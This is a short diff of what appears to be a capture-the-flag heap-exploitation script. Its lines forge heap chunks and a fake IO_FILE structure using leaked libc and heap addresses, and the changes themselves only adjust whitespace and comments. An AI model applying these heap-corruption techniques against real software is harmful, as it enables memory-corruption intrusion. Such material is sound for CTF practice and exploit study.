@@ -335,7 +335,9 @@ add(4,0x500)
 
 edit(0,p64(heap+0x1940)+p64(libcbase+0x1ebfe0)+p64(heap+0x1940)+p64(heap+0x1940))
 edit(1,p64(libcbase+0x1ebfe0)+p64(heap+0x1430)*3)#fake_io
-add(3,0x450)#fake_io
+
+add(3,0x450)#fake_io/overlap
+
 add(4,0x460)
 
 
@@ -759,8 +761,8 @@ delete(1)
 add(4,0x500)
 	
 	
-	edit(0,p64(heap+0x510)+p64(libcbase+0x1ebfe0)+p64(heap+0x510)+p64(heap+0x510))
-	edit(1,p64(libcbase+0x1ebfe0)+p64(heap)+p64(heap)+p64(heap))
+edit(0,p64(heap+0x510)+p64(libcbase+0x1ebfe0)+p64(heap+0x510)+p64(heap+0x510))
+edit(1,p64(libcbase+0x1ebfe0)+p64(heap)+p64(heap)+p64(heap))
 add(0,0x450)#fake_l
 add(4,0x460)
 	
